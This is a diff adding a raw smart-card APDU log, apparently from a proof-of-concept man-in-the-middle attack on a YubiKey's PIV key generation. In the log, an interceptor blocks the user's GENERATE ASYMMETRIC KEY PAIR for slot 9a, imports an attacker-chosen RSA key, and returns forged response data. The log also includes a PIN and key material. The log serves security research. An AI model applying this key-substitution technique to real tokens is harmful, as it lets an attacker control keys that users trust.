@@ -1,0 +1,122 @@
+Connected to card in 'Yubico Yubikey 4 OTP+U2F+CCID 00 00'
+Connected to virtual PCD at localhost:35963
+Power Up
+Power Down
+Power Up
+
+User command      10 bytes: A4     SELECT     Select a file.
+0000:  00 A4 04 00 05 A0 00 00 03 08                    ..........
+
+Response          21 bytes: 90 00  [I] Command successfully executed (OK).
+0000:  61 11 4F 06 00 00 10 00 01 00 79 07 4F 05 A0 00  a.O.......y.O...
+0010:  00 03 08 90 00                                   .....
+
+User command       9 bytes: 87     GENERAL AUTHENTICATE The General Authenticate command is used to generate secure messaging session keys between both entities (IFD and ICC) as part of elliptic curve asymmetric key mutual authentication.
+0000:  00 87 03 9B 04 7C 02 80 00                       .....|...
+
+Response          14 bytes: 90 00  [I] Command successfully executed (OK).
+0000:  7C 0A 80 08 01 03 1F FF 7C 16 4D C3 90 00        |.......|.M...
+
+User command      27 bytes: 87     GENERAL AUTHENTICATE The General Authenticate command is used to generate secure messaging session keys between both entities (IFD and ICC) as part of elliptic curve asymmetric key mutual authentication.
+0000:  00 87 03 9B 16 7C 14 80 08 FC E8 60 E2 98 77 16  .....|.....`..w.
+0010:  56 81 08 FC 74 31 FF B1 5A 6C 2B                 V...t1..Zl+
+
+Response          14 bytes: 90 00  [I] Command successfully executed (OK).
+0000:  7C 0A 82 08 FE 9D A2 53 EB 79 DF 9C 90 00        |......S.y....
+
+User command      13 bytes: 20     VERIFY     Verify the transferred data (such as a PIN).
+0000:  00 20 00 80 08 31 32 33 34 35 36 FF FF           . ...123456..
+
+Response           2 bytes: 90 00  [I] Command successfully executed (OK).
+0000:  90 00                                            ..
+
+User command      10 bytes: 47     GENERATE ASYMMETRIC KEY PAIR x
+0000:  00 47 00 9A 05 AC 03 80 01 07                    .G........
+>>> Intercepting GENERATE ASYMMETRIC KEY PAIR slot 9a
+
+Attacker command 260 bytes: FE     IMPORT ASYMMETRIC KEY Import a new asymmetric key.
+0000:  10 FE 07 9A FF 01 81 80 F8 48 84 D6 8B 41 8A E6  .........H...A..
+0010:  97 43 B9 EF 5A 71 B6 0D F8 4E EB 20 45 EE C2 E3  .C..Zq...N. E...
+0020:  7C 75 B9 65 3B 29 36 C6 C8 1B EB 25 23 82 93 45  |u.e;)6....%#..E
+0030:  5C F2 9B 12 AC F0 80 54 BF CB 36 AC 48 BA CB A9  \......T..6.H...
+0040:  5A 6B E2 05 F6 03 80 24 95 68 61 F5 D4 2B D6 AC  Zk.....$.ha..+..
+0050:  A9 4E 8C 26 B3 5D E0 AD 50 E9 F3 4B 42 5F 14 D9  .N.&.]..P..KB_..
+0060:  14 06 FB 0B DE 99 32 51 9D C3 B9 5B 7C 73 95 0C  ......2Q...[|s..
+0070:  22 CB 09 F9 74 BA 2E 19 F4 59 D8 D7 7F 09 2D 95  "...t....Y....-.
+0080:  5D 9B A4 B4 C2 B9 DE 8D 02 81 80 EC AE 57 AD 99  ]............W..
+0090:  45 46 46 47 60 C7 70 82 46 94 2A 53 0E 8C D6 E4  EFFG`.p.F.*S....
+00a0:  60 63 15 7E 81 D6 C3 45 86 5A 61 28 B7 32 8A 45  `c.~...E.Za(.2.E
+00b0:  AA FD FE 7E 2E D2 D9 7B 8C FB 1E D5 FA 1D 5A 4F  ...~...{......ZO
+00c0:  25 5B A4 E1 CC F7 48 C4 C4 99 4F 36 5C D1 0F 60  %[....H...O6\..`
+00d0:  1C 66 DF FB 26 7A CD AE B4 EB 55 4D C2 92 C5 3C  .f..&z....UM...<
+00e0:  63 D2 FD 77 A2 49 F3 2F A9 7E BA 14 E8 4E A3 0D  c..w.I./.~...N..
+00f0:  6D 56 FF AD D7 B9 96 8B 2E DD 5B 7A EF C3 EB B1  mV........[z....
+0100:  BA B0 F2 F1                                      ....
+
+Resp to attacker   2 bytes: 90 00  [I] Command successfully executed (OK).
+0000:  90 00                                            ..
+
+Attacker command 260 bytes: FE     IMPORT ASYMMETRIC KEY Import a new asymmetric key.
+0000:  10 FE 07 9A FF CD 74 45 54 B5 AC A7 03 81 80 15  ......tET.......
+0010:  08 8F B8 5D 33 C0 40 A8 AF E4 20 92 D8 EF 43 5F  ...]3.@... ...C_
+0020:  B5 CF D5 7C 17 2E 0B 77 8F C1 95 01 DE 0B F5 EB  ...|...w........
+0030:  1D F2 5D C3 14 5C C5 93 8A 39 F8 EB 0D B4 D1 79  ..]..\...9.....y
+0040:  2E 0E 03 AA 65 A8 BB 40 1D C3 98 1D AF 4E 3B CB  ....e..@.....N;.
+0050:  2C 7C A0 06 C9 6F F6 50 A1 86 DE 00 74 03 84 AB  ,|...o.P....t...
+0060:  46 26 86 49 A9 24 6A FF 77 57 ED 39 7E 60 F4 E9  F&.I.$j.wW.9~`..
+0070:  18 9B AB 54 6F B6 40 C0 F1 D2 76 7F 9D 06 2A CC  ...To.@...v...*.
+0080:  B8 8F D6 31 BC E5 4F B2 0E 6D 75 A2 C9 7C 41 04  ...1..O..mu..|A.
+0090:  81 80 E3 D8 0A 0B D2 8A FF D5 D4 0C F4 B1 F8 97  ................
+00a0:  DD 36 C9 72 2E 5F 08 C7 49 5B 7D C7 9C 69 AB 5A  .6.r._..I[}..i.Z
+00b0:  65 53 37 10 F5 14 6B 70 EA C6 BD CE 71 A8 6F EA  eS7...kp....q.o.
+00c0:  0E 2D 67 2C 3A 69 9F DB 84 D7 BB 8F C7 56 44 26  .-g,:i.......VD&
+00d0:  46 B8 1C CB 49 6E 95 C5 81 BB 89 59 47 CB 0D AE  F...In.....YG...
+00e0:  99 06 2B AF 6D FF 75 DD 5B 56 2A 7F 0E D5 8F 42  ..+.m.u.[V*....B
+00f0:  89 FE B4 F5 D6 0D DD 75 2E D5 40 13 76 53 D8 75  .......u..@.vS.u
+0100:  2B 1F 4F BF                                      +.O.
+
+Resp to attacker   2 bytes: 90 00  [I] Command successfully executed (OK).
+0000:  90 00                                            ..
+
+Attacker command 150 bytes: FE     IMPORT ASYMMETRIC KEY Import a new asymmetric key.
+0000:  00 FE 07 9A 91 D5 49 E6 74 A4 B7 9B D3 7F 64 E6  ......I.t.....d.
+0010:  E1 65 ED 05 81 80 F1 8A 7F FE B7 C0 E9 E7 6D 68  .e............mh
+0020:  11 D6 51 B8 1D 9D 7A 6E 7A FB BE 5E E0 DF FD 3D  ..Q...znz..^...=
+0030:  89 55 31 8D 84 25 14 AF D0 2E 5B 14 2C B1 DD D2  .U1..%....[.,...
+0040:  B3 AA 4B 54 F6 57 58 38 2D DD 7B 4F 24 4F F4 7B  ..KT.WX8-.{O$O.{
+0050:  82 30 3A 22 5A 97 83 71 78 5F 0F 84 20 99 52 E3  .0:"Z..qx_.. .R.
+0060:  9E 66 B4 F8 54 A5 81 22 00 AE 27 F7 21 11 DF 5A  .f..T.."..'.!..Z
+0070:  29 22 2D CE 9C 22 29 AA B7 A7 86 11 47 35 77 07  )"-..").....G5w.
+0080:  6B 40 0C 20 8E A0 11 F7 49 FA 80 C5 3D E5 13 0A  k@. ....I...=...
+0090:  68 88 06 BF E2 5A                                h....Z
+
+Resp to attacker   2 bytes: 90 00  [I] Command successfully executed (OK).
+0000:  90 00                                            ..
+
+Fake response    256 bytes: 61 10  [I] Command successfully executed; \XX\ bytes of data are available and can be requested using GET RESPONSE.
+0000:  7F 49 82 01 09 81 82 01 00 E5 8B F0 C9 15 00 48  .I.............H
+0010:  00 62 1B 25 90 53 E4 24 99 96 BF 44 15 13 41 37  .b.%.S.$...D..A7
+0020:  21 93 8E 30 30 ED 28 2B 86 C9 6A BC 5D 94 8A F4  !..00.(+..j.]...
+0030:  A5 02 34 D9 86 D8 15 68 48 11 BD 61 85 E9 27 49  ..4....hH..a..'I
+0040:  77 2D ED AF 7E 2F 9A E0 C2 97 CA 54 63 26 5F A8  w-..~/.....Tc&_.
+0050:  E6 6E 61 56 28 D8 B1 BA CC BC 31 05 94 4F 5B B0  .naV(.....1..O[.
+0060:  DB 6F C3 73 AB 18 66 4F 73 9E 0B 01 B3 05 A2 1E  .o.s..fOs.......
+0070:  14 C4 95 80 B0 57 00 4B C0 EA C4 A4 9E FE 6F 70  .....W.K......op
+0080:  90 68 38 0E 37 F4 D0 CA 16 70 9C 1B 53 AA 55 98  .h8.7....p..S.U.
+0090:  01 D8 15 84 9B 54 BB 85 2D 57 9B 5D 92 19 BF 89  .....T..-W.]....
+00a0:  18 60 96 1D 8E A4 83 66 08 61 3B DD B0 CF AA 29  .`.....f.a;....)
+00b0:  19 30 A0 0E 64 CE D8 C4 D7 C5 20 B6 55 71 B0 3D  .0..d..... .Uq.=
+00c0:  8B 20 38 3C 0A 42 90 74 29 BD DD 7D 17 2D EA 64  . 8<.B.t)..}.-.d
+00d0:  3B BA 86 F7 00 CC 6A 89 AB 8C 2F 63 91 96 B9 02  ;.....j.../c....
+00e0:  94 E0 C4 31 41 14 C3 A0 10 9B 5A A4 DD 95 26 23  ...1A.....Z...&#
+00f0:  3A D5 36 F0 61 D8 44 B6 2B BF 53 2E D8 24 61 10  :.6.a.D.+.S..$a.
+
+User command       5 bytes: C0     GET RESPONSE Retrieves the response from a previous command.
+0000:  00 C0 00 00 00                                   .....
+>>> Intercepting GET RESPONSE
+
+Fake response     18 bytes: 90 00  [I] Command successfully executed (OK).
+0000:  BC E0 04 0F BE 6F 31 86 77 E9 FB 82 03 01 00 01  .....o1.w.......
+0010:  90 00                                            ..
+Reset
+Power Down
